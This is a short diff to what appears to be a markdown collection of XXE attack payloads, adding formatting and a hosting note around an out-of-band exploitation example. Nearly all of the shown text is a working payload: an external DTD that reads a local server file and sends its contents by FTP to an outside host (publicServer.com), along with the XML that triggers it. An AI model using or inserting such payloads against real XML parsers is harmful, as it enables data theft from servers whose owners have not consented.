@@ -11,7 +11,10 @@ http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html
 %send;
 ]>
 <data>4</data>
+```
 
-<!ENTITY % payload SYSTEM "file:///sys/power/image_size">
+File stored on http://publicServer.com/parameterEntity_sendftp.dtd
+```<!ENTITY % payload SYSTEM "file:///sys/power/image_size">
 <!ENTITY % param1 "<!ENTITY &#37; send SYSTEM 'ftp://publicServer.com/%payload;'>">
 %param1;
+```
